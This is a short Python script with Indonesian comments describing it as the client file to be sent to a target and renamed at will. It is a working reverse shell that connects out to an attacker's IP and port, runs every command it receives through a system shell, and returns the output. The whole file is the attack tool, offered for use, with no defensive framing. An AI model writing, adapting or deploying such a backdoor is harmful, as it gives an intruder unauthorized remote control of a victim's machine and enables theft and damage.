#client.py adalah sebuah source code python yang nanti nya di kirimkan ke target
#tidak harus dengan namanya client.py,terserah mau di ganti nama apa aja yang penting berformat (.py)
import socket
import subprocess

REMOTE_HOST = 'taruh ip anda di sini' # '192.168.43.82'
REMOTE_PORT = 8081 # 2222 # untuk portnya terserah
client = socket.socket()
print("\033[1;92m[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)
